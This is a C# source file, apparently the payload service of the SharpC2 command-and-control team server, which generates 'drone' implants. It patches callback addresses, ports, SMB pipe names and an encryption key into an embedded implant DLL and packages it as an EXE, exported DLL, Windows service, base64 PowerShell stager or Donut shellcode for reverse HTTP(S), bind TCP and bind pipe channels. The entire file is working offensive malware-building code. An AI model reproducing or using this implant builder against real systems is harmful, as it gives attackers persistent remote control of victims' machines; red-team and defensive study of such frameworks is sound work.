using System.Reflection;
using System.Text;

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.DotNet.Writer;
using dnlib.PE;

using Donut;
using Donut.Structs;

using TeamServer.Handlers;
using TeamServer.Interfaces;
using TeamServer.Utilities;

namespace TeamServer.Services;

public class PayloadService : IPayloadService
{
    private readonly ICryptoService _crypto;

    public PayloadService(ICryptoService crypto)
    {
        _crypto = crypto;
    }

    public async Task<byte[]> GeneratePayload(Handler handler, PayloadFormat format)
    {
        switch (handler.PayloadType)
        {
            case PayloadType.REVERSE_HTTP:
            {
                var httpHandler = (HttpHandler)handler;
                return await GenerateHttpPayload(httpHandler.ConnectAddress, httpHandler.ConnectPort,
                    httpHandler.Secure, format);
            }

            case PayloadType.REVERSE_HTTPS:
            {
                var httpHandler = (HttpHandler)handler;
                return await GenerateHttpPayload(httpHandler.ConnectAddress, httpHandler.ConnectPort, httpHandler.Secure, format);
            }

            case PayloadType.BIND_PIPE:
            {
                var smbHandler = (SmbHandler)handler;
                return await GenerateBindSmbPayload(smbHandler.PipeName, format);
            }

            case PayloadType.BIND_TCP:
            {
                var tcpHandler = (TcpHandler)handler;
                return await GenerateBindTcpPayload(tcpHandler.BindPort, tcpHandler.LoopbackOnly, format);
            }
            
            case PayloadType.REVERSE_TCP:
                throw new NotImplementedException();
            
            case PayloadType.CUSTOM:
                throw new NotImplementedException();
            
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    public async Task<byte[]> GenerateHttpPayload(string connectAddress, int connectPort, bool secure, PayloadFormat format)
    {
        var droneModule = await GetDroneModule();
        
        // get the http handler
        var httpHandlerDef = droneModule.GetTypeDef("Drone.Handlers.HttpHandler");
        
        // set connect address
        var connectAddressDef = httpHandlerDef.GetMethodDef("System.String Drone.Handlers.HttpHandler::get_ConnectAddress()");

        var address = secure ? "https://" : "http://";
        address += connectAddress;
        
        connectAddressDef.Body.Instructions[0].Operand = address;
        
        // set connect port
        var connectPortDef = httpHandlerDef.GetMethodDef("System.String Drone.Handlers.HttpHandler::get_ConnectPort()");
        connectPortDef.Body.Instructions[0].Operand = connectPort.ToString();

        await using var ms = new MemoryStream();
        droneModule.Write(ms);

        var drone = ms.ToArray();

        return format switch
        {
            PayloadFormat.Exe => await BuildExe(drone),
            PayloadFormat.Dll => BuildDll(drone),
            PayloadFormat.ServiceExe => await BuildServiceExe(drone),
            PayloadFormat.PowerShell => await BuildPowerShellScript(drone),
            PayloadFormat.Shellcode => await BuildShellcode(drone),
            
            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
        };
    }

    public async Task<byte[]> GenerateBindTcpPayload(int bindPort, bool loopbackOnly, PayloadFormat format)
    {
        var droneModule = await GetDroneModule();
        
        // get the tcp handler
        var tcpHandlerDef = droneModule.GetTypeDef("Drone.Handlers.TcpHandler");
        
        // set the bind port
        var bindPortDef = tcpHandlerDef.GetMethodDef("System.Int32 Drone.Handlers.TcpHandler::get_BindPort()");
        bindPortDef.Body.Instructions[0].Operand = bindPort.ToString();
        
        // set the bind address
        var loopbackDef = tcpHandlerDef.GetMethodDef("System.Boolean Drone.Handlers.TcpHandler::get_LoopbackOnly()");
        loopbackDef.Body.Instructions[0].OpCode = loopbackOnly ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        
        // get drone class
        var droneDef = droneModule.GetTypeDef("Drone.Drone");
        
        // set handler ctor
        var getHandlerDef = droneDef.GetMethodDef("Drone.Handlers.Handler Drone.Drone::GetHandler()");
        var tcpHandlerCtor = tcpHandlerDef.GetMethodDef("System.Void Drone.Handlers.TcpHandler::.ctor()");
        getHandlerDef.Body.Instructions[0].Operand = tcpHandlerCtor;
        
        await using var ms = new MemoryStream();
        droneModule.Write(ms);

        var drone = ms.ToArray();
        
        return format switch
        {
            PayloadFormat.Exe => await BuildExe(drone),
            PayloadFormat.Dll => BuildDll(drone),
            PayloadFormat.ServiceExe => await BuildServiceExe(drone),
            PayloadFormat.PowerShell => await BuildPowerShellScript(drone),
            PayloadFormat.Shellcode => await BuildShellcode(drone),
            
            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
        };
    }

    public async Task<byte[]> GenerateBindSmbPayload(string pipeName, PayloadFormat format)
    {
        var droneModule = await GetDroneModule();
        
        // get the smb handler
        var smbHandlerDef = droneModule.GetTypeDef("Drone.Handlers.SmbHandler");
        
        // set the pipe name
        var pipeNameDef = smbHandlerDef.GetMethodDef("System.String Drone.Handlers.SmbHandler::get_PipeName()");
        pipeNameDef.Body.Instructions[0].Operand = pipeName;
        
        // get drone class
        var droneDef = droneModule.GetTypeDef("Drone.Drone");
        
        // set handler ctor
        var getHandlerDef = droneDef.GetMethodDef("Drone.Handlers.Handler Drone.Drone::GetHandler()");
        var smbHandlerCtor = smbHandlerDef.GetMethodDef("System.Void Drone.Handlers.SmbHandler::.ctor()");
        getHandlerDef.Body.Instructions[0].Operand = smbHandlerCtor;
        
        await using var ms = new MemoryStream();
        droneModule.Write(ms);

        var drone = ms.ToArray();
        
        return format switch
        {
            PayloadFormat.Exe => await BuildExe(drone),
            PayloadFormat.Dll => BuildDll(drone),
            PayloadFormat.ServiceExe => await BuildServiceExe(drone),
            PayloadFormat.PowerShell => await BuildPowerShellScript(drone),
            PayloadFormat.Shellcode => await BuildShellcode(drone),
            
            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
        };
    }

    private static async Task<byte[]> BuildExe(byte[] payload)
    {
        var stager = await GetEmbeddedResource("exe_stager.exe");
        var module = ModuleDefMD.Load(stager);
        module.Resources.Add(new EmbeddedResource("drone", payload));
        module.Name = "drone.exe";

        using var ms = new MemoryStream();
        module.Write(ms);

        return ms.ToArray();
    }

    private static byte[] BuildDll(byte[] payload)
    {
        var module = ModuleDefMD.Load(payload);
        module.Name = "drone.dll";
        
        var programDef = module.GetTypeDef("Drone.Program");
        var execDef = programDef.GetMethodDef("System.Void Drone.Program::Execute()");

        // add unmanaged export
        execDef.ExportInfo = new MethodExportInfo();
        execDef.IsUnmanagedExport = true;

        var opts = new ModuleWriterOptions(module)
        {
            PEHeadersOptions =
            {
                Machine = Machine.AMD64
            },
            Cor20HeaderOptions =
            {
                Flags = 0
            }
        };

        using var ms = new MemoryStream();
        module.Write(ms, opts);

        return ms.ToArray();
    }

    private static async Task<byte[]> BuildServiceExe(byte[] payload)
    {
        var shellcode = await BuildShellcode(payload);
        var stager = await GetEmbeddedResource("svc_stager.exe");
        var module = ModuleDefMD.Load(stager);
        module.Resources.Add(new EmbeddedResource("drone", shellcode));
        module.Name = "drone_svc.exe";

        using var ms = new MemoryStream();
        module.Write(ms);

        return ms.ToArray();
    }

    private static async Task<byte[]> BuildPowerShellScript(byte[] payload)
    {
        // build exe
        var exe = await BuildExe(payload);
        
        // get stager ps1
        var stager = await GetEmbeddedResource("stager.ps1");
        var stagerText = Encoding.ASCII.GetString(stager);

        // insert exe
        stagerText = stagerText.Replace("{{DATA}}", Convert.ToBase64String(exe));
        
        // remove ZWNBSP
        stagerText = stagerText.Remove(0, 3);

        return Encoding.ASCII.GetBytes(stagerText);
    }

    private static async Task<byte[]> BuildShellcode(byte[] payload)
    {
        var tmpShellcodePath = Path.GetTempFileName().Replace(".tmp", ".bin");
        var tmpPayloadPath = Path.GetTempFileName().Replace(".tmp", ".exe");
        
        // write drone to disk
        await File.WriteAllBytesAsync(tmpPayloadPath, payload);
        
        // donut config
        var config = new DonutConfig
        {
            Arch = 3, // x86+amd64
            Bypass = 1, // none
            Domain = "SharpC2",
            Class = "Drone.Program",
            Method = "Execute",
            InputFile = tmpPayloadPath,
            Payload = tmpShellcodePath
        };
        
        // generate shellcode
        Generator.Donut_Create(ref config);
        var shellcode = await File.ReadAllBytesAsync(tmpShellcodePath);
        
        // delete temp files
        File.Delete(tmpShellcodePath);
        File.Delete(tmpPayloadPath);
        File.Delete($"{tmpShellcodePath}.b64");

        return shellcode;
    }

    private async Task<ModuleDef> GetDroneModule()
    {
        var bytes = await GetEmbeddedResource("drone.dll");
        var module = ModuleDefMD.Load(bytes);

        // write in crypto key
        var key = await _crypto.GetKey();

        var cryptoClass = module.GetTypeDef("Drone.Crypto");
        var keyMethod = cryptoClass.GetMethodDef("System.Byte[] Drone.Crypto::get_Key()");
        keyMethod.Body.Instructions[0].Operand = Convert.ToBase64String(key);

        return module;
    }

    private static async Task<byte[]> GetEmbeddedResource(string name)
    {
        var self = Assembly.GetExecutingAssembly();
        await using var rs = self.GetManifestResourceStream($"TeamServer.Resources.{name}");

        if (rs is null)
            return Array.Empty<byte>();

        await using var ms = new MemoryStream();
        await rs.CopyToAsync(ms);

        return ms.ToArray();
    }
}